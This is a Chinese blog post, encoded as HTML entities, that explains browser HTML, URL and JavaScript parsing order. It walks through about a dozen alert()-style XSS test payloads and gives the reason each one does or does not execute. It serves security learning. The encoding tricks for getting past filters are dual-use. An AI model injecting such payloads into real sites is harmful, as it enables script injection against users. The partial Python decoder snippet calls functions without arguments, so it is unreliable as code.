;: &#x5B57;&#x7B26;&#x5B9E;&#x4F53;<br>&#x5B57;&#x7B26;&#x5B9E;&#x4F53;&#x662F;&#x4E00;&#x4E2A;&#x8F6C;&#x4E49;&#x5E8F;&#x5217;&#xFF0C;&#x5B83;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x822C;&#x65E0;&#x6CD5;&#x5728;&#x6587;&#x672C;&#x5185;&#x5BB9;&#x4E2D;&#x8F93;&#x5165;&#x7684;&#x5355;&#x4E2A;&#x5B57;&#x7B26;&#x6216;&#x7B26;&#x53F7;&#x3002;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x5B9E;&#x4F53;&#x4EE5;&#x4E00;&#x4E2A;<code>&amp;</code>&#x7B26;&#x53F7;&#x5F00;&#x59CB;&#xFF0C;&#x540E;&#x9762;&#x8DDF;&#x7740;&#x4E00;&#x4E2A;&#x9884;&#x5B9A;&#x4E49;&#x7684;&#x5B9E;&#x4F53;&#x7684;&#x540D;&#x79F0;&#xFF0C;&#x6216;&#x662F;&#x4E00;&#x4E2A;<code>#</code>&#x7B26;&#x53F7;&#x4EE5;&#x53CA;&#x5B57;&#x7B26;&#x7684;&#x5341;&#x8FDB;&#x5236;&#x6570;&#x5B57;&#x3002;<br>&#x2014;&#x2014;&#x300B;&#x4EA7;&#x751F;&#x95EE;&#x9898;: &#x4E3A;&#x5565;&#x6211;&#x8981;&#x7528;&#x5B57;&#x7B26;&#x5B9E;&#x4F53;&#x5462;&#xFF0C;&#x8981;&#x7ECF;&#x8FC7;&#x8F6C;&#x4E49;&#x8FD9;&#x4E48;&#x9EBB;&#x70E6;&#x7684;&#x64CD;&#x4F5C; &#x2014;&#x2014;&#x3009;HTML&#x5B57;&#x7B26;&#x5B9E;&#x4F53;<br>&#x5728;HTML&#x4E2D;&#xFF0C;&#x67D0;&#x4E9B;&#x5B57;&#x7B26;&#x662F;&#x9884;&#x7559;&#x7684;&#x3002;&#x4F8B;&#x5982;&#x5728;HTML&#x4E2D;&#x4E0D;&#x80FD;&#x4F7F;&#x7528;&#x201C;&lt;&#x201D;&#x6216;&#x201C;&gt;&#x201D;&#xFF0C;&#x8FD9;&#x662F;&#x56E0;&#x4E3A;&#x6D4F;&#x89C8;&#x5668;&#x53EF;&#x80FD;&#x8BEF;&#x8BA4;&#x4E3A;&#x5B83;&#x4EEC;&#x662F;&#x6807;&#x7B7E;&#x7684;&#x5F00;&#x59CB;&#x6216;&#x7ED3;&#x675F;&#x3002;&#x5982;&#x679C;&#x5E0C;&#x671B;&#x6B63;&#x786E;&#x5730;&#x663E;&#x793A;&#x9884;&#x7559;&#x5B57;&#x7B26;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x5728;HTML&#x4E2D;&#x4F7F;&#x7528;&#x5BF9;&#x5E94;&#x7684;&#x5B57;&#x7B26;&#x5B9E;&#x4F53;&#x3002;</p>
<p>&#x5916;&#x90E8;&#x5143;&#x7D20;&#x5BB9;&#x7EB3;&#x79CD;&#x7C7B;&#x7684;&#x6BD4;&#x7A7A;&#x5143;&#x7D20;&#x3001;&#x539F;&#x59CB;&#x6587;&#x672C;&#x5143;&#x7D20;&#x591A;&#xFF0C;&#x6709;&#x4EC0;&#x4E48;&#x7528;&#x5462;&#xFF1F;<br>Foreign elements &#x2014;&#x2014;&#x300B; SVG&#x9ED1;&#x9B54;&#x6CD5;<br><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</code> &#x8FD9;&#x4E2A;payload&#x80FD;&#x6267;&#x884C;&#x7684;&#x539F;&#x56E0;&#x662F;&#x56E0;&#x4E3A; <code>&lt;svg&gt;</code> &#x9075;&#x5FAA;XML&#x548C;SVG&#x7684;&#x5B9A;&#x4E49;&#x3002;&#x5728;XML&#x4E2D;&#xFF0C;<code>&amp;#40;</code>&#x4F1A;&#x88AB;&#x89E3;&#x6790;&#x6210; <code>&#xFF08;</code>&#x3002;&#x540C;&#x7406; <code>&lt;svg&gt;&lt;script&gt;alert&amp;#x28;1);&lt;/script&gt;</code> &#x4E5F;&#x53EF;&#x4EE5;&#x9020;&#x6210; XSS<br>tips: &#x5728;XML&#x4E2D;&#x5B9E;&#x4F53;&#x4F1A;&#x81EA;&#x52A8;&#x8F6C;&#x4E49;,&#x9664;&#x4E86;<code>&lt;![CDATA[</code>&#x548C;<code>]]&gt;</code>&#x5305;&#x542B;&#x7684;&#x5B9E;&#x4F53;</p>
<p>&#x4E0B;&#x9762;&#x5F00;&#x59CB;&#x8FDB;&#x5165;HTML&#x89E3;&#x6790;&#x8FC7;&#x7A0B;&#x2026;</p>
<p>&#x4E00;&#x4E2A;HTML&#x89E3;&#x6790;&#x5668;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x72B6;&#x6001;&#x673A;&#xFF0C;HTML&#x89E3;&#x6790;&#x5668;&#x6709;&#x5F88;&#x591A;&#x79CD;&#x72B6;&#x6001;&#x3002;&#x8FDB;&#x884C;&#x72B6;&#x6001;&#x8F6C;&#x6362;&#x7684;&#x65B9;&#x5F0F;&#x662F;&#x4ECE;&#x8F93;&#x5165;&#x6D41;&#x4E2D;&#x83B7;&#x53D6;&#x5B57;&#x7B26;&#x5E76;&#x6309;&#x7167;&#x8F6C;&#x6362;&#x89C4;&#x5219;&#x8F6C;&#x6362;&#x3002;&#x4EE5; <code>&lt;start&gt;content&lt;/end&gt;</code> &#x4E3A;&#x4F8B;&#x5B50;&#x3002;HTML&#x8BC6;&#x522B;&#x5F00;&#x59CB;&#x548C;&#x7ED3;&#x675F;&#x6807;&#x7B7E;&#x7684;&#x6838;&#x5FC3;&#x662F; <code>/</code> &#x7B26;&#x53F7;&#x3002;&#x5F53;HTML&#x89E3;&#x6790;&#x5668;&#x9047;&#x5230; <code>&lt;</code>  &#x4E14;&#x6CA1;&#x6709; <code>/</code> &#x3002;&#x5C31;&#x4F1A;&#x8FDB;&#x5165; <strong>&#x6807;&#x7B7E;&#x5F00;&#x59CB;&#x72B6;&#x6001;</strong> &#x7136;&#x540E;&#x8F6C;&#x53D8;&#x5230; <strong>&#x6807;&#x7B7E;&#x540D;&#x72B6;&#x6001;</strong>&#xFF0C; <strong>&#x524D;&#x5C5E;&#x6027;&#x540D;&#x72B6;&#x6001;</strong> &#x2026; &#x6700;&#x540E;&#x8FDB;&#x5165; <strong>&#x6570;&#x636E;&#x72B6;&#x6001;</strong>&#x3002; &#x5E76;&#x91CA;&#x653E;&#x5F53;&#x524D;&#x6807;&#x7B7E;&#x7684;token&#x3002;&#x5F53;&#x89E3;&#x6790;&#x5668;&#x5904;&#x4E8E;<strong>&#x6570;&#x636E;&#x72B6;&#x6001;</strong>&#x65F6;&#xFF0C;&#x5B83;&#x4F1A;&#x7EE7;&#x7EED;&#x89E3;&#x6790;&#xFF0C;&#x6BCF;&#x5F53;&#x53D1;&#x73B0;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x6807;&#x7B7E;&#xFF0C;&#x5C31;&#x4F1A;&#x91CA;&#x653E;&#x51FA;&#x4E00;&#x4E2A;token&#x3002;</p>
<p>&#x5BB9;&#x7EB3;&#x5B57;&#x7B26;&#x5B9E;&#x4F53;&#x7684;&#x4F5C;&#x7528;: &#x5728;&#x8FD9;&#x4E9B;&#x72B6;&#x6001;&#x4E2D;HTML&#x5B57;&#x7B26;&#x5B9E;&#x4F53;&#x5C06;&#x4F1A;&#x4ECE; <code>&amp;#...</code>&#x5F62;&#x5F0F;&#x89E3;&#x7801;&#x3002;&#x4E09;&#x79CD;&#x60C5;&#x51B5;&#x53EF;&#x4EE5;&#x5BB9;&#x7EB3;&#x5B57;&#x7B26;&#x5B9E;&#x4F53;&#xFF1A; <strong>&#x6570;&#x636E;&#x72B6;&#x6001;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x5F15;&#x7528;</strong>&#xFF0C;<strong>RCDATA&#x72B6;&#x6001;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x5F15;&#x7528;</strong>&#x548C;<strong>&#x5C5E;&#x6027;&#x503C;&#x72B6;&#x6001;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x5F15;&#x7528;</strong>&#x3002;</p>
<p>&#x6709;&#x4E00;&#x79CD;&#x53EF;&#x4EE5;&#x5BB9;&#x7EB3;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x7684;&#x60C5;&#x51B5;&#x662F; <strong>RCDATA&#x72B6;&#x6001;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x5F15;&#x7528;</strong>&#x3002;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x5728;<code>&lt;textarea&gt;</code>&#x548C;<code>&lt;title&gt;</code>&#x6807;&#x7B7E;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x4F1A;&#x88AB;HTML&#x89E3;&#x6790;&#x5668;&#x89E3;&#x7801;&#x3002;&#x4E14;&#x5728;&#x89E3;&#x6790;&#x8FD9;&#x4E9B;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x4E0D;&#x4F1A;&#x8FDB;&#x5165; <strong>&#x6807;&#x7B7E;&#x5F00;&#x59CB;&#x72B6;&#x6001;</strong> &#x3002;&#x5BF9;RCDATA&#x6709;&#x4E2A;&#x7279;&#x6B8A;&#x7684;&#x60C5;&#x51B5;&#x3002;&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x89E3;&#x6790;RCDATA&#x5143;&#x7D20;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x89E3;&#x6790;&#x5668;&#x4F1A;&#x8FDB;&#x5165; <strong>RCDATA&#x72B6;&#x6001;</strong>&#x3002;&#x5728;&#x8FD9;&#x4E2A;&#x72B6;&#x6001;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x9047;&#x5230;<code>&lt;</code>&#x5B57;&#x7B26;&#xFF0C;&#x5B83;&#x4F1A;&#x8F6C;&#x6362;&#x5230;RCDATA&#x5C0F;&#x4E8E;&#x53F7;&#x72B6;&#x6001;&#x3002;&#x5982;&#x679C;&lt;&#x5B57;&#x7B26;&#x540E;&#x6CA1;&#x6709;&#x7D27;&#x8DDF;&#x7740;/&#x548C;&#x5BF9;&#x5E94;&#x7684;&#x6807;&#x7B7E;&#x540D;&#xFF0C;&#x89E3;&#x6790;&#x5668;&#x4F1A;&#x8F6C;&#x6362;&#x56DE;RCDATA&#x72B6;&#x6001;&#x3002;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x5728;RCDATA&#x5143;&#x7D20;&#x6807;&#x7B7E;&#x7684;&#x5185;&#x5BB9;&#x4E2D;&#xFF08;&#x4F8B;&#x5982;<code>&lt;textarea&gt;</code>&#x6216;<code>&lt;title&gt;</code>&#x7684;&#x5185;&#x5BB9;&#x4E2D;&#xFF09;&#xFF0C;&#x552F;&#x4E00;&#x80FD;&#x591F;&#x88AB;&#x89E3;&#x6790;&#x5668;&#x8BA4;&#x505A;&#x662F;&#x6807;&#x7B7E;&#x7684;&#x5C31;&#x662F;<code>&lt;/textarea&gt;</code>&#x6216;&#x8005;<code>&lt;/title&gt;</code>&#x3002;&#x5F53;&#x7136;&#xFF0C;&#x8FD9;&#x8981;&#x770B;&#x5F00;&#x59CB;&#x6807;&#x7B7E;&#x662F;&#x54EA;&#x4E00;&#x4E2A;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x5728;<code>&lt;textarea&gt;</code>&#x548C;<code>&lt;title&gt;</code>&#x7684;&#x5185;&#x5BB9;&#x4E2D;&#x4E0D;&#x4F1A;&#x521B;&#x5EFA;&#x6807;&#x7B7E;&#xFF0C;&#x4E0D;&#x4F1A;&#x6709;&#x811A;&#x672C;&#x6267;&#x884C;&#x3002;</p>
<h3 id="URL-&#x89E3;&#x6790;"><a href="#URL-&#x89E3;&#x6790;" class="headerlink" title="URL &#x89E3;&#x6790;"></a>URL &#x89E3;&#x6790;</h3><p>URL&#x8D44;&#x6E90;&#x7C7B;&#x578B;&#x5FC5;&#x987B;&#x662F;ASCII&#x5B57;&#x6BCD;<code>&#xFF08;U+0041-U+005A || U+0061-U+007A&#xFF09;</code>&#xFF0C;&#x4E0D;&#x7136;&#x5C31;&#x4F1A;&#x8FDB;&#x5165;&#x201C;&#x65E0;&#x7C7B;&#x578B;&#x201D;&#x72B6;&#x6001;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x4F60;&#x4E0D;&#x80FD;&#x5BF9;&#x534F;&#x8BAE;&#x7C7B;&#x578B;&#x8FDB;&#x884C;&#x4EFB;&#x4F55;&#x7684;&#x7F16;&#x7801;&#x64CD;&#x4F5C;&#xFF0C;&#x4E0D;&#x7136;URL&#x89E3;&#x6790;&#x5668;&#x4F1A;&#x8BA4;&#x4E3A;&#x5B83;&#x65E0;&#x7C7B;&#x578B;&#x3002;</p>
<h3 id="JavaScript-&#x89E3;&#x6790;"><a href="#JavaScript-&#x89E3;&#x6790;" class="headerlink" title="JavaScript &#x89E3;&#x6790;"></a>JavaScript &#x89E3;&#x6790;</h3><p>Unicode&#x8F6C;&#x4E49;&#x5E8F;&#x5217;&#x53EA;&#x6709;&#x5728;&#x6807;&#x8BC6;&#x7B26;&#x540D;&#x79F0;&#x91CC;&#x4E0D;&#x88AB;&#x5F53;&#x4F5C;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x4E5F;&#x53EA;&#x6709;&#x5728;&#x6807;&#x8BC6;&#x7B26;&#x540D;&#x79F0;&#x91CC;&#x7684;&#x7F16;&#x7801;&#x5B57;&#x7B26;&#x80FD;&#x591F;&#x88AB;&#x6B63;&#x5E38;&#x7684;&#x89E3;&#x6790;&#x3002;javascript&#x89E3;&#x7801;&#x5668;&#x65E0;&#x6CD5;&#x8BD5;&#x522B;&#x7F16;&#x7801;&#x540E;&#x7684;&#x63A7;&#x5236;&#x5B57;&#x7B26;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x53CC;&#x5F15;&#x53F7;&#x548C;&#x5706;&#x62EC;&#x53F7;&#xFF0C;&#x4E4B;&#x540E;&#x4F1A;&#x7528;&#x4E00;&#x4E9B;&#x4F8B;&#x5B50;&#x8FDB;&#x884C;&#x8BE6;&#x7EC6;&#x8BF4;&#x660E;&#x3002;</p>
<h3 id="Python-&#x8F6C;&#x7801;&#x811A;&#x672C;"><a href="#Python-&#x8F6C;&#x7801;&#x811A;&#x672C;" class="headerlink" title="Python &#x8F6C;&#x7801;&#x811A;&#x672C;"></a>Python &#x8F6C;&#x7801;&#x811A;&#x672C;</h3><p>&#x81EA;&#x5DF1;&#x6700;&#x8FD1;&#x5728;&#x5199;&#x4E00;&#x4E2A;XSS&#x7684;&#x626B;&#x63CF;&#x811A;&#x672C;&#xFF0C;&#x5176;&#x4E2D;&#x4E00;&#x4E2A;&#x6A21;&#x5757;&#x5177;&#x6709;&#x5224;&#x65AD; XSS payload &#x7684;&#x6709;&#x6548;&#x6027;&#x7684;&#x529F;&#x80FD;&#x3002;&#x8FD9;&#x91CC;&#x7ED9;&#x51FA;&#x90E8;&#x5206;&#x8F6C;&#x7801;&#x7247;&#x6BB5;</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> html</span><br><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line">payload = <span class="hljs-string">&apos;&apos;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decodeHTML</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    dh = html.unescape()</span><br><span class="line">    <span class="hljs-keyword">return</span> dh</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decodeURL</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    du = unquote()</span><br><span class="line">    <span class="hljs-keyword">return</span> du</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decodeUnicode</span><span class="hljs-params">(payload)</span>:</span></span><br><span class="line">    duni = payload.encode(<span class="hljs-string">&apos;utf-8&apos;</span>).decode(<span class="hljs-string">&apos;unicode_escape&apos;</span>)</span><br><span class="line">    <span class="hljs-keyword">return</span> duni</span><br></pre></td></tr></tbody></table></figure><p></p>
<h3 id="&#x4ECE;payload&#x770B;&#x89E3;&#x6790;&#x6D41;&#x7A0B;"><a href="#&#x4ECE;payload&#x770B;&#x89E3;&#x6790;&#x6D41;&#x7A0B;" class="headerlink" title="&#x4ECE;payload&#x770B;&#x89E3;&#x6790;&#x6D41;&#x7A0B;"></a>&#x4ECE;payload&#x770B;&#x89E3;&#x6790;&#x6D41;&#x7A0B;</h3><p>1&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x4E0D;&#x5F39;&#x7A97;&#xFF0C; &#x539F;&#x56E0;: &#x8BC6;&#x522B;&#x5230; href &#xFF0C;&#x5C5E;&#x6027;&#x503C;&#x72B6;&#x6001;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x3002;&#x8FDB;&#x5165;url&#x6A21;&#x5757;&#x89E3;&#x6790;&#x3002;URL&#x89C4;&#x5B9A;&#x534F;&#x8BAE;&#xFF0C;&#x7528;&#x6237;&#x540D;&#xFF0C;&#x5BC6;&#x7801;&#x90FD;&#x5FC5;&#x987B;&#x662F;ASCII&#x3002;&#x4E14;&#x4E0D;&#x80FD;&#x5BF9;&#x534F;&#x8BAE;&#x7C7B;&#x578B;&#x8FDB;&#x884C;&#x4EFB;&#x4F55;&#x7684;&#x7F16;&#x7801;&#x64CD;&#x4F5C;&#x3002;&#x8FD9;&#x91CC;&#x7684; <code>javascript</code> &#x534F;&#x8BAE;&#x65E0;&#x6CD5;&#x8BC6;&#x522B;&#x3002;<p></p>
<p>2&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5F39;&#x7A97;&#xFF0C; &#x539F;&#x56E0;: &#x5C5E;&#x6027;&#x503C;&#x72B6;&#x6001;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x3002;&#x8BC6;&#x522B;&#x5230;&#x5B9E;&#x4F53;&#x5316;&#x7F16;&#x7801;&#x5185;&#x5BB9;&#xFF0C;&#x8FDB;&#x5165;html&#x89E3;&#x7801;&#x5F97;&#x5230; <code>&lt;a href=&quot;javascript:%61%6c%65%72%74%28%32%29&quot;&gt;</code>&#x3002;&#x7136;&#x540E;&#x8FDB;&#x5165; URL &#x89E3;&#x6790;&#x3002;&#x6B64;&#x65F6;&#x53EF;&#x6B63;&#x786E;&#x8BC6;&#x522B;&#x534F;&#x8BAE;&#x7C7B;&#x578B;&#x3002;&#x89E3;&#x7801;&#x5F97;&#x5230;<code>&lt;a href=&quot;javascript:alert(2)&quot;&gt;</code> &#x6700;&#x540E; JavaScript &#x89E3;&#x6790;&#x3002;</p>
<p>3&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript%3aalert(3)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x4E0D;&#x5F39;&#x7A97;&#xFF0C; &#x539F;&#x56E0;&#x540C;&#x4E00;&#xFF0C; &#x8FD9;&#x91CC; <code>javascript:</code> &#x4E3A;&#x534F;&#x8BAE;&#xFF0C;&#x4EFB;&#x4F55;&#x4E00;&#x90E8;&#x5206;&#x5185;&#x5BB9;&#x90FD;&#x4E0D;&#x80FD;&#x7F16;&#x7801;</p>
<p>4&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&amp;#60;img src=x onerror=alert(4)&amp;#62;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x4E0D;&#x5F39;&#x7A97;&#xFF0C; &#x539F;&#x56E0;: &#x5C5E;&#x6027;&#x503C;&#x72B6;&#x6001;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#xFF0C;&#x5148;&#x8FDB;&#x884C; HTML &#x89E3;&#x6790;&#x3002;&#x4F46; HTML &#x89E3;&#x6790;&#x673A;&#x5236;&#x4E2D;<code>&amp;#60;</code>&#x4F1A;&#x88AB; HTML &#x89E3;&#x7801;&#xFF0C;&#x4F46;&#x4E0D;&#x4F1A;&#x8FDB;&#x5165;&#x6807;&#x7B7E;&#x5F00;&#x59CB;&#x72B6;&#x6001;&#xFF0C;&#x5F53;&#x7136;&#x4E5F;&#x5C31;&#x4E0D;&#x4F1A;&#x521B;&#x5EFA; img &#x5143;&#x7D20;&#x3002;(HTML&#x7F16;&#x7801;&#x5C31;&#x662F;&#x4E3A;&#x4E86;&#x663E;&#x793A;&#x8FD9;&#x4E9B;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#xFF0C;&#x800C;&#x4E0D;&#x5E72;&#x6270;&#x6B63;&#x5E38;&#x7684;DOM&#x89E3;&#x6790;)<p></p>
<p>5&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span>&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x4E0D;&#x5F39;&#x7A97;&#xFF0C; &#x539F;&#x56E0;&#x4E3A;: <code>&lt;textarea&gt;</code>&#x662F;RCDATA&#x5143;&#x7D20;&#xFF0C;&#x53EF;&#x4EE5;&#x5BB9;&#x7EB3;&#x6587;&#x672C;&#x548C;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#xFF0C;&#x6CE8;&#x610F;&#x4E0D;&#x80FD;&#x5BB9;&#x7EB3;&#x5176;&#x4ED6;&#x5143;&#x7D20;&#xFF0C;HTML&#x89E3;&#x7801;&#x5F97;&#x5230;<code>&lt;textarea&gt;&lt;script&gt;alert(5)&lt;/script&gt;&lt;/textarea&gt;</code>&#x4F46; <code>&lt;textarea&gt;</code>&#x53EA;&#x5BB9;&#x7EB3;&#x6587;&#x672C;&#x548C;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x3002;&#x56E0;&#x6B64;js&#x65E0;&#x6CD5;&#x6267;&#x884C;<p></p>
<p>6&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(6)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x4E0D;&#x5F39;&#x7A97;&#xFF0C; &#x539F;&#x56E0;&#x540C;5<p></p>
<p>7&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;confirm(&apos;7&amp;#39;);&quot;</span>&gt;</span>Button<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x5F39;&#x7A97;&#xFF0C; &#x539F;&#x56E0;: &#x5C5E;&#x6027;&#x503C;&#x72B6;&#x6001;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#xFF0C;&#x5148;&#x8FDB;&#x884C;HTML&#x89E3;&#x7801;&#x3002;&#x7136;&#x540E;JS&#x6267;&#x884C;<p></p>
<p>8&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;confirm(&apos;8\u0027);&quot;</span>&gt;</span>Button<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x4E0D;&#x5F39;&#x7A97;&#xFF0C; &#x539F;&#x56E0;: &#x5728;JavaScript&#x4E2D;&#xFF0C;&#x6807;&#x8BC6;&#x7B26;&#x53EA;&#x80FD;&#x5305;&#x542B;&#x5B57;&#x6BCD;&#x6216;&#x6570;&#x5B57;&#x6216;&#x4E0B;&#x5212;&#x7EBF;&#xFF08;&#x201C;<code>_</code>&#x201D;&#xFF09;&#x6216;&#x7F8E;&#x5143;&#x7B26;&#x53F7;&#xFF08;&#x201C;<code>$</code>&#x201D;&#xFF09;&#xFF0C;&#x4E14;&#x4E0D;&#x80FD;&#x4EE5;&#x6570;&#x5B57;&#x5F00;&#x5934;&#x3002; <code>onclick</code>&#x4E2D;&#x7684;&#x503C;&#x4F1A;&#x4EA4;&#x7ED9;JS&#x5904;&#x7406;&#xFF0C;&#x5728;JS&#x4E2D;&#x53EA;&#x6709;&#x5B57;&#x7B26;&#x4E32;&#x548C;&#x6807;&#x8BC6;&#x7B26;&#x80FD;&#x7528;Unicode&#x8868;&#x793A;&#xFF0C;<code>&apos;</code>&#x663E;&#x7136;&#x4E0D;&#x884C;&#xFF0C;JS&#x6267;&#x884C;&#x5931;&#x8D25;&#x3002;<p></p>
<p>9&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x4E0D;&#x5F39;&#x7A97;&#xFF0C; &#x539F;&#x56E0;: <code>script</code>&#x6807;&#x7B7E;&#x5C5E;&#x4E8E;&#x539F;&#x59CB;&#x6587;&#x672C;&#x5143;&#x7D20;&#x3002;&#x65E0;&#x6CD5;&#x5BB9;&#x7EB3;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#xFF0C;&#x6240;&#x4EE5;&#x65E0;&#x6CD5;&#x8FDB;&#x884C;HTML&#x89E3;&#x7801;&#x3002;&#x56E0;&#x6B64;JS&#x89E3;&#x6790;&#x65F6;&#x5E76;&#x4E0D;&#x80FD;&#x6267;&#x884C;&#x5F39;&#x7A97;<p></p>
<p>10&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>\u0061\u006c\u0065\u0072\u0074(10);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x5F39;&#x7A97;&#xFF0C; &#x539F;&#x56E0;: &#x76F4;&#x63A5;&#x8FDB;&#x5165; JavaScript &#x89E3;&#x6790;&#x3002;&#x4E14;&#x53D1;&#x73B0;unicode&#x7F16;&#x7801;&#xFF0C;&#x5176;&#x4E3A; alert &#x6807;&#x8BC6;&#x7B26;&#x8FDB;&#x884C;&#x7F16;&#x7801;&#x540E;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x3002;&#x6240;&#x4EE5;&#x80FD;&#x5148;&#x89E3;&#x7801;&#xFF0C;&#x7136;&#x540E;&#x6267;&#x884C;<p></p>
<p>11&#x3001;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x4E0D;&#x5F39;&#x7A97;&#xFF0C; &#x539F;&#x56E0;&#x540C;8: &#x51FA;&#x73B0;&#x62EC;&#x53F7;&#x8FDB;&#x884C;&#x4E86;unicode&#x7F16;&#x7801;&#xFF0C;JS&#x65E0;&#x6CD5;&#x8BC6;&#x522B;&#x7F16;&#x7801;&#x540E;&#x7684;&#x63A7;&#x5236;&#x5B57;&#x7B26;<p></p>
